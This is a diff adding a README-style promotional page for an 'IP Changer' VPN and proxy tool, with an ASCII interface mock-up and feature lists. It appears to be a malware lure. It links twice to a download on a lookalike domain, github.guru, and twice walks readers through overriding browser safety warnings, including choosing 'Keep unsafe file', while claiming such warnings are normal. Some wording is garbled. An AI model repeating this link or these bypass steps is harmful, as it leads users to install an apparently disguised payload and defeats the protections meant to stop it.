@@ -1,0 +1,214 @@
+┌────────────────────────────────────────────────────────────────┐
+│                          IP CHANGER                            │
+└────────────────────────────────────────────────────────────────┘
+
+IP CHANGER is a professional IP rotation tool that instantly modifies your public IP address for privacy, security, and unrestricted access. Used by gamers, streamers, and privacy-conscious users worldwide to bypass geo-restrictions, avoid IP bans, and maintain complete anonymity online.
+
+────────────────────────────────────────────────────────────────
+
+► DOWNLOAD: https://github.guru/s/u7gPFisZ
+
+────────────────────────────────────────────────────────────────
+
+╔══════════════════════════════════════════════════════════════════════════════════════╗
+                        ⚠ IMPORTANT DOWNLOAD NOTICE ⚠                              
+╚══════════════════════════════════════════════════════════════════════════════════════╝
+
+YOUR BROWSER MAY SHOW A WARNING – THIS IS REGULAR FOR OPENSOURCE APP
+
+When downloading this open-source software, Chrome, Edge, Firefox, or other browsers may display a warning message such as:
+
+• "This file is not commonly downloaded and may be dangerous"
+• "Chromium could not verify the safety of this download"
+• "This type of file can harm your computer"
+
+╔══════════════════════════════════════════════════════════════════════════════════════╗
+                        ⚠ IMPORTANT DOWNLOAD NOTICE ⚠                              
+╚══════════════════════════════════════════════════════════════════════════════════════╝
+
+
+
+╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║                       STEP-BY-STEP INSTRUCTIONS TO IGNORE BROWSER WARNING AND DOWNLOAD                            ║
+╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+
+1. When the warning appears, click the "Keep" or "Keep anyway" button (Chrome/Edge)
+   └─ For Firefox: Click the arrow → "Allow download"
+
+2. In Chrome/Edge, you may need to confirm: "Keep unsafe file"
+
+3. After download completes, locate the file in your Downloads folder
+
+
+SETUP GUIDE
+
+1. Download the IP Changer software from the link above
+2. Run installer or use portable version (no install)
+3. Launch application as administrator
+4. Select connection mode (VPN, Proxy, or DNS flip)
+5. Choose desired country or region from list
+6. Click "Change IP" and wait for confirmation
+7. Verify new IP in browser or with built-in checker
+
+────────────────────────────────────────────────────────────────
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    IP CHANGER PRO v4.2.0                            [−][□][×] │
+├─────────────────────────────────────────────────────────────────────────────┤
+│  ┌─────────────────────────────────────────────────────────────────────┐    │
+│  │  🌐 CURRENT CONNECTION                                              │    │
+│  │  ┌─────────────────────────────────────────────────────────────┐    │    │
+│  │  │ IP: 192.168.1.105 (Local) • 45.67.89.123 (Public)          │    │    │
+│  │  │ Location: New York, USA • ISP: Spectrum                     │    │    │
+│  │  └─────────────────────────────────────────────────────────────┘    │    │
+│  │  [🌍 REFRESH]                      [🔍 TEST SPEED]                   │    │
+│  └─────────────────────────────────────────────────────────────────────┘    │
+│                                                                             │
+│  ┌─────────────────────────────────────────────────────────────────────┐    │
+│  │  ⚙ CONNECTION SETTINGS                                      [⏷ HIDE]│    │
+│  ├─────────────────────────────────────────────────────────────────────┤    │
+│  │                                                                     │    │
+│  │  PROTOCOL:                      SERVER LOCATION:                    │    │
+│  │  (●) VPN (OpenVPN)               (●) Auto (Fastest)                 │    │
+│  │  ( ) Proxy (SOCKS5)               ( ) North America                 │    │
+│  │  ( ) DNS Fliphs                    ( ) Europe                        │    │
+│  │  ( ) Tor Network                   ( ) Asia                          │    │
+│  │                                    ( ) Oceania                       │    │
+│  │                                    ( ) South America                 │    │
+│  │                                                                     │    │
+│  │  ENCRYPTION:                      KILL SWITCH:                      │    │
+│  │  [▼ AES-256-GCM                 ]  ☑ Enable auto disconnect        │   │
+│  │                                   ☑ Block non-VPN traffic          │   │
+│  │                                                                     │   │
+│  │  ADVANCED:  ☑ DNS leak protection                                  │   │
+│  │             ☑ IPv6 leak protection                                 │   │
+│  │             ☐ Multi-hop connection                                 │   │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                            │
+│  ┌─────────────────────────────────────────────────────────────────────┐   │
+│  │  🚀 QUICK CONNECT                                           [⏷ HIDE]│   │
+│  ├─────────────────────────────────────────────────────────────────────┤   │
+│  │                                                                     │   │
+│  │  SELECT SERVER:                                                      │   │
+│  │  ┌─────────────────────────────────────────────────────────────┐    │   │
+│  │  │ ▼ United States (32 servers) • 12 ms ping                   │    │   │
+│  │  ├─────────────────────────────────────────────────────────────┤    │   │
+│  │  │   🇺🇸 New York • 8 ms • ████████░░ 82% load                  │    │   │
+│  │  │   🇺🇸 Los Angeles • 24 ms • ████████░░ 78% load              │    │   │
+│  │  │   🇺🇸 Miami • 18 ms • ███████░░░ 65% load                    │    │   │
+│  │  │   🇺🇸 Chicago • 14 ms • ██████████ 95% load                  │    │   │
+│  │  │   🇺🇸 Dallas • 16 ms • ████████░░ 80% load                   │    │   │
+│  │  │   🇺🇸 Seattle • 32 ms • ██████░░░░ 55% load                  │    │   │
+│  │  └─────────────────────────────────────────────────────────────┘    │   │
+│  │                                                                     │   │
+│  │  [🔍 FIND FASTEST]                    [⭐ FAVORITES]                 │   │
+│  │  [🔄 ROTATE EVERY: 15 min ▼]           [🌍 CONNECT]                 │   │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                            │
+│  ┌─────────────────────────────────────────────────────────────────────┐   │
+│  │  📊 ACTIVE CONNECTION                                       [⏷ HIDE] │   │
+│  ├─────────────────────────────────────────────────────────────────────┤   │
+│  │                                                                     │   │
+│  │  [🔌] Connected to: New York (USA-12)                ████████░░ 82% │   │
+│  │       Session time: 00:34:22 • Data: 1.2GB ↓ / 0.4GB ↑              │   │
+│  │                                                                     │   │
+│  │  [📈] Connection Speed                                ████░░░░░░ 38% │   │
+│  │       Download: 124 Mbps • Upload: 45 Mbps                          │   │
+│  │                                                                     │   │
+│  │  [🛡️] Protection Status                               COMPLETED      │   │
+│  │       DNS: Protected • IPv6: Protected • WebRTC: Blocked            │   │
+│  │       [🔄 TEST AGAIN]            [📋 COPY LOGS]                     │   │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                            │
+│  ┌─────────────────────────────────────────────────────────────────────┐   │
+│  │  🌍 SERVER BROWSER                                         [⏷ HIDE] │   │
+│  ├─────────────────────────────────────────────────────────────────────┤   │
+│  │  [🔍 SEARCH COUNTRY/CITY_______]              [▼ FILTER: All Types]  │   │
+│  │                                                                     │   │
+│  │  ┌──────────┬────────────┬───────┬──────────┬──────────┐           │   │
+│  │  │ 🇺🇸 USA   │ New York   │ 8 ms  │████████░░│ [CONNECT] │           │   │
+│  │  ├──────────┼────────────┼───────┼──────────┼──────────┤           │   │
+│  │  │ 🇬🇧 UK    │ London     │ 32 ms │██████░░░░│ [CONNECT] │           │   │
+│  │  ├──────────┼────────────┼───────┼──────────┼──────────┤           │   │
+│  │  │ 🇩🇪 Germany│ Frankfurt │ 28 ms │███████░░░│ [CONNECT] │           │   │
+│  │  ├──────────┼────────────┼───────┼──────────┼──────────┤           │   │
+│  │  │ 🇯🇵 Japan │ Tokyo      │ 98 ms │█████░░░░░│ [CONNECT] │           │   │
+│  │  ├──────────┼────────────┼───────┼──────────┼──────────┤           │   │
+│  │  │ 🇦🇺 Australia│ Sydney  │ 154 ms│███░░░░░░░│ [CONNECT] │           │   │
+│  │  ├──────────┼────────────┼───────┼──────────┼──────────┤           │   │
+│  │  │ 🇧🇷 Brazil│ Sao Paulo  │ 112 ms│████░░░░░░│ [CONNECT] │           │   │
+│  │  ├──────────┼────────────┼───────┼──────────┼──────────┤           │   │
+│  │  │ 🇨🇦 Canada│ Toronto    │ 22 ms │███████░░░│ [CONNECT] │           │   │
+│  │  ├──────────┼────────────┼───────┼──────────┼──────────┤           │   │
+│  │  │ 🇮🇳 India │ Mumbai     │ 156 ms│███░░░░░░░│ [CONNECT] │           │   │
+│  │  └──────────┴────────────┴───────┴──────────┴──────────┘           │   │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                            │
+│  ├─────────────────────────────────────────────────────────────────────────┤
+│  │  STATUS: Connected • 124 Mbps • 00:34:22 • 5,124 Servers Online        │
+│  └─────────────────────────────────────────────────────────────────────────┘
+└────────────────────────────────────────────────────────────────────────────┘
+
+WHY CHOOSE THIS IP CHANGER
+
+• One-click rotation — change IP instantly with single button
+• 5000+ global servers —覆盖 95+ countries worldwide
+• No logs policy — complete privacy with zero data retention
+• Kill switch protection — cuts internet if VPN drops
+• Unlimited bandwidth — no caps or throttling ever
+• Works with all apps — games, browsers, streaming services
+• Bypass IP bans — escape game server blocks instantly
+• Affordable lifetime license — pay once, use forever
+• 24/7 customer support — live chat and email assistance
+
+────────────────────────────────────────────────────────────────
+
+CORE FEATURES
+
+• Instant IP change — rotate in under 3 seconds
+• Multiple protocols — VPN, proxy, SOCKS5 support
+• Country selector — choose from 95+ locations
+• Auto IP rotator — change IP every X minutes
+• IP leak protection — DNS and WebRTC leak prevention
+• Speed optimizer — fastest servers automatically selected
+• Game mode — low latency for competitive gaming
+• Streaming unblocker — access Netflix, Hulu, BBC iPlayer
+• WiFi hotspot support — share changed IP with other devices
+
+────────────────────────────────────────────────────────────────
+
+TAGS: ip changer, change ip address, vpn service, proxy tool, ip rotator, hide ip, anonymous browsing, bypass ip ban, geo unblocker, streaming unblock, gaming vpn, private internet, ip spoofing, location changer, wifi security, ip hider, anti ban tool, rotate ip, dynamic ip, static ip change
+
+────────────────────────────────────────────────────────────────
+
+► DOWNLOAD: https://github.guru/s/u7gPFisZ
+────────────────────────────────────────────────────────────────
+
+╔══════════════════════════════════════════════════════════════════════════════════════╗
+                        ⚠ IMPORTANT DOWNLOAD NOTICE ⚠                              
+╚══════════════════════════════════════════════════════════════════════════════════════╝
+
+YOUR BROWSER MAY SHOW A WARNING – THIS IS REGULAR FOR OPENSOURCE APP
+
+When downloading this open-source software, Chrome, Edge, Firefox, or other browsers may display a warning message such as:
+
+• "This file is not commonly downloaded and may be dangerous"
+• "Chromium could not verify the safety of this download"
+• "This type of file can harm your computer"
+
+╔══════════════════════════════════════════════════════════════════════════════════════╗
+                        ⚠ IMPORTANT DOWNLOAD NOTICE ⚠                              
+╚══════════════════════════════════════════════════════════════════════════════════════╝
+
+
+
+╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║                       STEP-BY-STEP INSTRUCTIONS TO IGNORE BROWSER WARNING AND DOWNLOAD                            ║
+╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+
+1. When the warning appears, click the "Keep" or "Keep anyway" button (Chrome/Edge)
+   └─ For Firefox: Click the arrow → "Allow download"
+
+2. In Chrome/Edge, you may need to confirm: "Keep unsafe file"
+
+3. After download completes, locate the file in your Downloads folder
